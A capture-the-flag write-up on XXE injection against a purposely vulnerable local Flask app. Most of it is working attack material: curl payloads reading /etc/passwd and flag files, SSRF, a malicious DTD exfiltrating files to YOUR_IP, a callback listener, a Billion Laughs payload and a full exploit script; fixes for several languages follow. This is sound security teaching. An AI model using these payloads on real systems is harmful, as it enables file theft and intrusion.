---
title: "Web - XXE Injection"
description: "Exploiting XML External Entity injection in a Flask application to read local files, perform SSRF, and exfiltrate data out-of-band to capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Extreme            |
| Points     | 550                |
| Flag       | `zemi{xx3_3xt3rn4l_3nt1ty}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-xxe-injection/app.py)
- [flag.txt](/Website/challenges/web-xxe-injection/flag.txt)
- [README.md](/Website/challenges/web-xxe-injection/README.md)
- [requirements.txt](/Website/challenges/web-xxe-injection/requirements.txt)

## Prerequisites

This challenge assumes you have completed:

- **Web - SSRF** — understanding server-side request forgery and how internal resources are accessed
- **Web - Command Injection** — exploiting user input that reaches dangerous functions
- **Web - SSTI** — server-side injection attacks against template engines
- **Web - Insecure Deserialization** — how parsers can be abused for code execution

You should understand HTTP request crafting with curl and be comfortable writing Python scripts.

## Overview

XML External Entity (XXE) injection is a vulnerability that targets applications which parse XML input. The XML specification includes a feature called "external entities" that allows an XML document to reference external resources — local files, remote URLs, or internal network services. When an XML parser processes attacker-controlled XML without disabling this feature, the attacker can:

1. **Read local files** on the server (e.g., `/etc/passwd`, application source code, credentials)
2. **Perform SSRF** by making the server fetch internal URLs
3. **Exfiltrate data out-of-band** by sending file contents to an attacker-controlled server
4. **Cause denial of service** via recursive entity expansion (the "Billion Laughs" attack)

This challenge presents a Flask API that accepts XML input for product reviews. The XML parser (`lxml`) is configured with entity resolution enabled, allowing us to inject external entities and read the flag file.

## How XML External Entities Work

### XML Entity Basics

XML entities are like variables — they let you define a value once and reference it multiple times:

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY greeting "Hello, World!">
]>
<note>
  <message>&greeting;</message>
</note>
```

When parsed, `&greeting;` is replaced with `Hello, World!`.

### External Entities

External entities load their value from an external source using the `SYSTEM` keyword:

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<note>
  <message>&xxe;</message>
</note>
```

When the XML parser processes this, it reads `/etc/passwd` from the filesystem and substitutes its contents into the `<message>` element. This is XXE injection.

### Supported Protocols

The `SYSTEM` keyword supports various URI schemes depending on the parser and language:

| Protocol | Example | Language Support |
|----------|---------|-----------------|
| `file://` | `file:///etc/passwd` | All (Java, PHP, Python, .NET) |
| `http://` | `http://internal-api:8080/` | All |
| `https://` | `https://attacker.com/` | All |
| `ftp://` | `ftp://attacker.com/` | Java, PHP |
| `php://` | `php://filter/convert.base64-encode/resource=index.php` | PHP only |
| `jar://` | `jar:http://attacker.com/evil.jar!/evil.dtd` | Java only |
| `expect://` | `expect://whoami` | PHP (with expect extension) |
| `gopher://` | `gopher://internal:25/...` | Java, PHP (older versions) |

## Setting Up the Challenge Locally

Save the following as `app.py`:

```python
from flask import Flask, request, jsonify, Response
from lxml import etree
import os

app = Flask(__name__)

# Create flag file
with open("flag.txt", "w") as f:
    f.write("zemi{xx3_3xt3rn4l_3nt1ty}")

# Create a fake internal config for SSRF demonstration
with open("internal_config.json", "w") as f:
    f.write('{"db_password": "s3cret_db_p4ss", "api_key": "sk-12345abcdef"}')

# Simulated product database
products = {
    "1": {"name": "Widget A", "price": 9.99, "reviews": []},
    "2": {"name": "Widget B", "price": 19.99, "reviews": []},
    "3": {"name": "Widget C", "price": 29.99, "reviews": []},
}

@app.route("/")
def index():
    return """
    <h1>Product Review API</h1>
    <p>Submit product reviews in XML format!</p>
    <h2>Endpoints</h2>
    <ul>
        <li>GET /products - List all products</li>
        <li>POST /product/&lt;id&gt;/review - Submit a review (XML body)</li>
        <li>GET /product/&lt;id&gt;/reviews - View reviews for a product</li>
        <li>POST /parse - Generic XML parser endpoint</li>
    </ul>
    <h2>XML Review Format</h2>
    <pre>
&lt;review&gt;
    &lt;author&gt;Your Name&lt;/author&gt;
    &lt;rating&gt;5&lt;/rating&gt;
    &lt;comment&gt;Great product!&lt;/comment&gt;
&lt;/review&gt;
    </pre>
    """

@app.route("/products")
def list_products():
    result = []
    for pid, product in products.items():
        result.append({
            "id": pid,
            "name": product["name"],
            "price": product["price"],
            "review_count": len(product["reviews"])
        })
    return jsonify(result)

@app.route("/product/<product_id>/review", methods=["POST"])
def submit_review(product_id):
    """VULNERABLE: Parses XML with external entity resolution enabled."""
    if product_id not in products:
        return jsonify({"error": "Product not found"}), 404

    xml_data = request.data
    if not xml_data:
        return jsonify({"error": "No XML data provided"}), 400

    try:
        # VULNERABLE: resolve_entities=True allows external entity processing
        # The default for lxml is actually to resolve entities, but we make it explicit
        parser = etree.XMLParser(
            resolve_entities=True,
            dtd_validation=False,
            load_dtd=True,
            no_network=False  # Allow network access for external entities
        )
        root = etree.fromstring(xml_data, parser)

        # Extract review fields
        author = root.findtext("author", default="Anonymous")
        rating = root.findtext("rating", default="0")
        comment = root.findtext("comment", default="")

        review = {
            "author": author,
            "rating": int(rating) if rating.isdigit() else 0,
            "comment": comment
        }

        products[product_id]["reviews"].append(review)

        return jsonify({
            "message": "Review submitted successfully",
            "review": review
        })

    except etree.XMLSyntaxError as e:
        return jsonify({"error": f"Invalid XML: {str(e)}"}), 400
    except Exception as e:
        return jsonify({"error": f"Processing error: {str(e)}"}), 500

@app.route("/product/<product_id>/reviews")
def get_reviews(product_id):
    if product_id not in products:
        return jsonify({"error": "Product not found"}), 404
    return jsonify({
        "product": products[product_id]["name"],
        "reviews": products[product_id]["reviews"]
    })

@app.route("/parse", methods=["POST"])
def parse_xml():
    """VULNERABLE: Generic XML parser — echoes back parsed content."""
    xml_data = request.data
    if not xml_data:
        return jsonify({"error": "No XML data provided"}), 400

    try:
        parser = etree.XMLParser(
            resolve_entities=True,
            load_dtd=True,
            no_network=False
        )
        root = etree.fromstring(xml_data, parser)

        # Recursively extract all text content
        def extract_text(element):
            result = {}
            for child in element:
                if len(child) > 0:
                    result[child.tag] = extract_text(child)
                else:
                    result[child.tag] = child.text or ""
            return result

        data = extract_text(root)
        return jsonify({"parsed": data, "root_tag": root.tag})

    except etree.XMLSyntaxError as e:
        return jsonify({"error": f"Invalid XML: {str(e)}"}), 400
    except Exception as e:
        return jsonify({"error": f"Processing error: {str(e)}"}), 500

# Internal API (for SSRF demonstration)
@app.route("/internal/admin")
def internal_admin():
    """Simulated internal endpoint — should not be accessible externally."""
    return jsonify({
        "admin_panel": True,
        "flag_location": "/app/flag.txt",
        "users": ["admin", "root", "service"]
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

Install dependencies and run:

```bash
pip install flask lxml
python3 app.py
```

The app runs at `http://localhost:5000`.

## Reconnaissance

### Step 1: Explore the API

```bash
curl -s http://localhost:5000/products | python3 -m json.tool
```

```json
[
    {"id": "1", "name": "Widget A", "price": 9.99, "review_count": 0},
    {"id": "2", "name": "Widget B", "price": 19.99, "review_count": 0},
    {"id": "3", "name": "Widget C", "price": 29.99, "review_count": 0}
]
```

### Step 2: Submit a normal review

```bash
curl -s -X POST http://localhost:5000/product/1/review \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<review>
    <author>Alice</author>
    <rating>5</rating>
    <comment>Great product!</comment>
</review>' | python3 -m json.tool
```

```json
{
    "message": "Review submitted successfully",
    "review": {
        "author": "Alice",
        "rating": 5,
        "comment": "Great product!"
    }
}
```

The server parses our XML and echoes back the content. This is a good sign — if it processes entity references, we can inject external entities.

### Step 3: Test for XXE

```bash
curl -s -X POST http://localhost:5000/product/1/review \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY test "XXE_WORKS">
]>
<review>
    <author>&test;</author>
    <rating>5</rating>
    <comment>Testing entities</comment>
</review>' | python3 -m json.tool
```

```json
{
    "message": "Review submitted successfully",
    "review": {
        "author": "XXE_WORKS",
        "rating": 5,
        "comment": "Testing entities"
    }
}
```

The entity was resolved. The parser processes DTD entity declarations. Now let us try external entities.

## Exploitation

### Attack 1: Read local files (Classic XXE)

```bash
curl -s -X POST http://localhost:5000/product/1/review \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<review>
    <author>&xxe;</author>
    <rating>5</rating>
    <comment>XXE file read</comment>
</review>' | python3 -m json.tool
```

```json
{
    "message": "Review submitted successfully",
    "review": {
        "author": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:...",
        "rating": 5,
        "comment": "XXE file read"
    }
}
```

We can read `/etc/passwd`. Now read the flag:

```bash
curl -s -X POST http://localhost:5000/product/1/review \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<review>
    <author>&xxe;</author>
    <rating>5</rating>
    <comment>Reading the flag</comment>
</review>' | python3 -m json.tool
```

If the path is not `/app/flag.txt`, try the current directory:

```bash
curl -s -X POST http://localhost:5000/product/1/review \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt">
]>
<review>
    <author>&xxe;</author>
    <rating>5</rating>
    <comment>Reading the flag</comment>
</review>' | python3 -m json.tool
```

```json
{
    "message": "Review submitted successfully",
    "review": {
        "author": "zemi{xx3_3xt3rn4l_3nt1ty}",
        "rating": 5,
        "comment": "Reading the flag"
    }
}
```

Flag captured: `zemi{xx3_3xt3rn4l_3nt1ty}`

### Attack 2: XXE to SSRF

Use XXE to access internal services that are not directly reachable:

```bash
curl -s -X POST http://localhost:5000/product/1/review \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "http://localhost:5000/internal/admin">
]>
<review>
    <author>&xxe;</author>
    <rating>5</rating>
    <comment>SSRF via XXE</comment>
</review>' | python3 -m json.tool
```

```json
{
    "message": "Review submitted successfully",
    "review": {
        "author": "{\"admin_panel\": true, \"flag_location\": \"/app/flag.txt\", ...}",
        "rating": 5,
        "comment": "SSRF via XXE"
    }
}
```

The server fetched an internal endpoint on our behalf. In a real environment, this could access cloud metadata services (`http://169.254.169.254/`), internal APIs, or databases.

### Attack 3: Reading files with special characters (PHP filter equivalent)

Some files contain characters that break XML parsing (like `<`, `>`, `&`). To read these files, use a CDATA wrapper with parameter entities:

```bash
curl -s -X POST http://localhost:5000/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///proc/self/cwd/app.py">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % wrapper "<!ENTITY content &apos;%start;%file;%end;&apos;>">
  %wrapper;
]>
<data>
    <content>&content;</content>
</data>'
```

If the inline CDATA technique does not work (many parsers reject it), use an external DTD file instead (see Attack 5).

### Attack 4: Error-Based XXE Data Exfiltration

When the application does not reflect entity values in the response (blind XXE), you can use error-based exfiltration. Define an entity whose value triggers a parsing error that includes the file contents:

```bash
curl -s -X POST http://localhost:5000/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM &apos;file:///nonexistent/%file;&apos;>">
  %eval;
  %error;
]>
<data>test</data>'
```

The error message may contain:

```
I/O error : failed to load external entity "file:///nonexistent/my-hostname"
```

The file contents appear in the error message.

### Attack 5: Blind Out-of-Band (OOB) XXE

When the server does not reflect entity values at all and error messages are suppressed, use out-of-band exfiltration. The server fetches an external DTD from your machine, which instructs it to send the file contents to you via HTTP.

**Step A: Create a malicious DTD file**

Save as `evil.dtd` on your machine:

```xml
<!ENTITY % file SYSTEM "file:///proc/self/cwd/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8888/?data=%file;'>">
%eval;
%exfil;
```

**Step B: Start a local HTTP server to host the DTD and receive data**

```python
#!/usr/bin/env python3
"""
OOB XXE data exfiltration server.
Hosts the malicious DTD and receives exfiltrated data.
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import sys
import threading

class ExfilHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if "data" in params:
            print(f"\n[!] EXFILTRATED DATA: {params['data'][0]}")

        # Serve files normally (for the DTD)
        super().do_GET()

    def log_message(self, format, *args):
        # Log all requests
        print(f"[*] {self.client_address[0]} - {args[0]}")

if __name__ == "__main__":
    port = 8888
    server = HTTPServer(("0.0.0.0", port), ExfilHandler)
    print(f"[*] OOB XXE server listening on port {port}")
    print(f"[*] DTD URL: http://YOUR_IP:{port}/evil.dtd")
    print(f"[*] Waiting for exfiltrated data...\n")
    server.serve_forever()
```

**Step C: Send the XXE payload**

```bash
curl -s -X POST http://localhost:5000/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8888/evil.dtd">
  %dtd;
]>
<data>trigger</data>'
```

On your exfiltration server, you will see:

```
[*] 127.0.0.1 - GET /evil.dtd HTTP/1.0
[*] 127.0.0.1 - GET /?data=zemi{xx3_3xt3rn4l_3nt1ty} HTTP/1.0

[!] EXFILTRATED DATA: zemi{xx3_3xt3rn4l_3nt1ty}
```

### Attack 6: Billion Laughs (DoS)

This is a denial-of-service attack via recursive entity expansion. Each entity references the previous one, creating exponential expansion:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<data>&lol9;</data>
```

The string "lol" appears 10^9 times (1 billion) — consuming gigabytes of memory. **Do not use this against production systems.** It is included here for educational purposes only.

### Complete Exploit Script

```python
#!/usr/bin/env python3
"""
XXE Injection exploit suite for the Product Review API challenge.
Demonstrates multiple XXE attack variants.
"""

import requests
import sys
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
import time
import os

BASE = "http://localhost:5000"

def xxe_read_file(filepath):
    """Classic XXE — read a local file via entity substitution."""
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<review>
    <author>&xxe;</author>
    <rating>1</rating>
    <comment>xxe</comment>
</review>"""

    r = requests.post(
        f"{BASE}/product/1/review",
        data=payload,
        headers={"Content-Type": "application/xml"}
    )
    data = r.json()
    if "review" in data:
        return data["review"]["author"]
    return data.get("error", "Unknown error")

def xxe_ssrf(url):
    """Use XXE to perform SSRF — fetch an internal URL."""
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "{url}">
]>
<review>
    <author>&xxe;</author>
    <rating>1</rating>
    <comment>ssrf</comment>
</review>"""

    r = requests.post(
        f"{BASE}/product/1/review",
        data=payload,
        headers={"Content-Type": "application/xml"}
    )
    data = r.json()
    if "review" in data:
        return data["review"]["author"]
    return data.get("error", "Unknown error")

def xxe_oob_exfil(filepath, listen_port=8888):
    """
    Blind OOB XXE — exfiltrate file contents via HTTP callback.
    Starts a local HTTP server, sends XXE payload that makes the target
    fetch a DTD from us, which triggers a callback with the file contents.
    """
    exfiltrated = {"data": None}

    # Create the evil DTD
    dtd_content = f"""<!ENTITY % file SYSTEM "file://{filepath}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:{listen_port}/exfil?d=%file;'>">
%eval;
%exfil;"""

    with open("/tmp/evil.dtd", "w") as f:
        f.write(dtd_content)

    original_dir = os.getcwd()

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory="/tmp", **kwargs)

        def do_GET(self):
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            if "d" in params:
                exfiltrated["data"] = params["d"][0]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
            else:
                super().do_GET()

        def log_message(self, format, *args):
            pass  # Suppress logs

    server = HTTPServer(("0.0.0.0", listen_port), Handler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()

    # Send the XXE payload
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:{listen_port}/evil.dtd">
  %dtd;
]>
<data>trigger</data>"""

    try:
        requests.post(
            f"{BASE}/parse",
            data=payload,
            headers={"Content-Type": "application/xml"},
            timeout=5
        )
    except requests.exceptions.Timeout:
        pass

    time.sleep(2)
    server.shutdown()

    return exfiltrated["data"]

# ============================================================
# Main exploit
# ============================================================

print("=" * 60)
print("  XXE Injection Exploit Suite")
print("=" * 60)

# Attack 1: Read /etc/passwd
print("\n[*] Attack 1: Classic XXE — Reading /etc/passwd")
result = xxe_read_file("/etc/passwd")
print(f"[+] First line: {result.split(chr(10))[0]}")

# Attack 2: Read the flag
print("\n[*] Attack 2: Reading flag.txt")
for path in ["flag.txt", "/app/flag.txt", "/proc/self/cwd/flag.txt"]:
    result = xxe_read_file(path)
    if "zemi{" in result:
        print(f"[!] FLAG: {result}")
        break
    else:
        print(f"[-] {path}: {result[:80]}")

# Attack 3: SSRF
print("\n[*] Attack 3: SSRF via XXE — accessing internal admin panel")
result = xxe_ssrf("http://localhost:5000/internal/admin")
print(f"[+] Internal API response: {result[:200]}")

# Attack 4: Read application source
print("\n[*] Attack 4: Reading application source code")
result = xxe_read_file("/proc/self/cwd/app.py")
if "error" not in result.lower():
    print(f"[+] Got app.py ({len(result)} bytes)")
    # Find interesting parts
    for line in result.split("\n"):
        if "secret" in line.lower() or "password" in line.lower() or "flag" in line.lower():
            print(f"    [!] {line.strip()}")

# Attack 5: OOB exfiltration
print("\n[*] Attack 5: Blind OOB XXE exfiltration")
result = xxe_oob_exfil("/proc/self/cwd/flag.txt")
if result:
    print(f"[!] OOB Exfiltrated: {result}")
else:
    print("[-] OOB exfiltration did not return data (server may block outbound requests)")

print("\n" + "=" * 60)
print("  Exploit complete")
print("=" * 60)
```

Run the exploit:

```bash
python3 exploit.py
```

Expected output:

```
============================================================
  XXE Injection Exploit Suite
============================================================

[*] Attack 1: Classic XXE — Reading /etc/passwd
[+] First line: root:x:0:0:root:/root:/bin/bash

[*] Attack 2: Reading flag.txt
[!] FLAG: zemi{xx3_3xt3rn4l_3nt1ty}

[*] Attack 3: SSRF via XXE — accessing internal admin panel
[+] Internal API response: {"admin_panel": true, "flag_location": "/app/flag.txt", ...}

[*] Attack 4: Reading application source code
[+] Got app.py (3847 bytes)
    [!] f.write("zemi{xx3_3xt3rn4l_3nt1ty}")
    [!] f.write('{"db_password": "s3cret_db_p4ss", "api_key": "sk-12345abcdef"}')

[*] Attack 5: Blind OOB XXE exfiltration
[!] OOB Exfiltrated: zemi{xx3_3xt3rn4l_3nt1ty}

============================================================
  Exploit complete
============================================================
```

## XXE in Different Languages

### PHP

PHP's `simplexml_load_string()` and `DOMDocument` are vulnerable by default in older PHP versions:

```php
// Vulnerable (PHP < 8.0)
$xml = simplexml_load_string($user_input);

// Also vulnerable
$doc = new DOMDocument();
$doc->loadXML($user_input, LIBXML_NOENT);

// PHP-specific protocol for reading files with special chars:
// file:///etc/passwd works, but for PHP source code use:
// php://filter/convert.base64-encode/resource=index.php
```

### Java

Java's `DocumentBuilderFactory` is vulnerable by default:

```java
// Vulnerable
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));

// Java supports more protocols: file://, http://, ftp://, jar://
// jar:// is especially dangerous — it can fetch remote JARs
```

### Python (lxml)

The `lxml` library resolves entities by default when `resolve_entities=True`:

```python
# Vulnerable
from lxml import etree
parser = etree.XMLParser(resolve_entities=True)
root = etree.fromstring(user_input, parser)

# Python's built-in xml.etree.ElementTree is NOT vulnerable
# It does not process external entities at all
import xml.etree.ElementTree as ET
root = ET.fromstring(user_input)  # Safe (ignores DTDs)
```

### .NET

```csharp
// Vulnerable (.NET < 4.5.2 default settings)
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver(); // Enables external entities
doc.LoadXml(userInput);
```

## The Fix

### Fix for Python (lxml)

```python
from lxml import etree

@app.route("/product/<product_id>/review", methods=["POST"])
def submit_review_fixed(product_id):
    xml_data = request.data

    # SECURE: Disable entity resolution and external DTD loading
    parser = etree.XMLParser(
        resolve_entities=False,  # Do not resolve entities
        no_network=True,         # Block all network access
        load_dtd=False,          # Do not load external DTDs
        dtd_validation=False     # Do not validate against DTD
    )

    try:
        root = etree.fromstring(xml_data, parser)
    except etree.XMLSyntaxError as e:
        return jsonify({"error": f"Invalid XML: {str(e)}"}), 400

    author = root.findtext("author", default="Anonymous")
    rating = root.findtext("rating", default="0")
    comment = root.findtext("comment", default="")

    # Additional defense: strip any entity references that somehow survived
    import re
    entity_pattern = re.compile(r'&[a-zA-Z0-9#]+;')
    author = entity_pattern.sub('', author)
    comment = entity_pattern.sub('', comment)

    review = {
        "author": author,
        "rating": int(rating) if rating.isdigit() else 0,
        "comment": comment
    }

    products[product_id]["reviews"].append(review)
    return jsonify({"message": "Review submitted", "review": review})
```

### Fix for Java

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable all external entity processing
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputSource);
```

### Fix for PHP

```php
// PHP 8.0+: External entities are disabled by default
// For older versions:
libxml_disable_entity_loader(true);

$doc = new DOMDocument();
$doc->loadXML($input, LIBXML_NOENT | LIBXML_DTDLOAD);
// Better: do not use LIBXML_NOENT at all

// Best approach: use json_decode() if possible instead of XML
```

### Best Practice: Avoid XML Entirely

If possible, use JSON instead of XML. JSON parsers do not support entity references and are immune to XXE:

```python
@app.route("/product/<product_id>/review", methods=["POST"])
def submit_review_json(product_id):
    """Accept JSON instead of XML — immune to XXE."""
    data = request.get_json()
    review = {
        "author": data.get("author", "Anonymous"),
        "rating": int(data.get("rating", 0)),
        "comment": data.get("comment", "")
    }
    products[product_id]["reviews"].append(review)
    return jsonify({"message": "Review submitted", "review": review})
```

## Common Pitfalls

- **Assuming Python's stdlib XML parser is safe by default** — `xml.etree.ElementTree` is safe, but `lxml.etree` is not. Always check which parser the application uses.
- **Only blocking `file://` protocol** — attackers can use `http://`, `ftp://`, `gopher://`, and `php://` protocols. Disable entity resolution entirely rather than blacklisting protocols.
- **Forgetting parameter entities** — even if regular entities (`&xxe;`) are blocked, parameter entities (`%xxe;`) in the DTD can still trigger OOB exfiltration.
- **Not testing for blind XXE** — many real-world applications do not reflect entity values. Always test OOB techniques with a callback server.
- **Thinking WAFs block XXE** — XML can be encoded (UTF-16, UTF-7), compressed, or delivered via multipart forms to bypass Web Application Firewalls.
- **Missing XXE in file uploads** — DOCX, XLSX, SVG, and other XML-based file formats can contain XXE payloads. Any file upload that processes XML internally is a potential vector.

## Tools Used

- **curl** — crafting XML payloads and sending them to the target
- **Python (requests)** — automating multi-step XXE exploitation
- **Python (http.server)** — hosting malicious DTD files and receiving OOB callbacks
- **Burp Suite** — intercepting and modifying XML requests in the browser
- **XXEinjector** — automated XXE exploitation tool with OOB support

## Lessons Learned

- XML External Entity injection is one of the most impactful web vulnerabilities — it provides file read, SSRF, and sometimes RCE in a single bug
- Always disable external entity resolution in XML parsers. Every major language has a way to do this, but the default settings vary
- Blind XXE (OOB exfiltration) is just as dangerous as classic XXE — the lack of direct output does not mean the vulnerability is unexploitable
- XXE can hide in unexpected places: file uploads (DOCX, SVG, XLSX), SOAP APIs, SAML authentication, RSS/Atom feeds, and any other XML-based protocol
- The safest approach is to avoid XML entirely and use JSON. If XML is required, use a parser configured to reject DTDs and external entities
- When testing for XXE, always try multiple file paths (`/etc/passwd`, `/proc/self/cwd/`, `/proc/self/environ`) and multiple protocols (`file://`, `http://`, `php://`)
- Parameter entities (`%entity;`) work differently from general entities (`&entity;`) and are critical for blind XXE exploitation
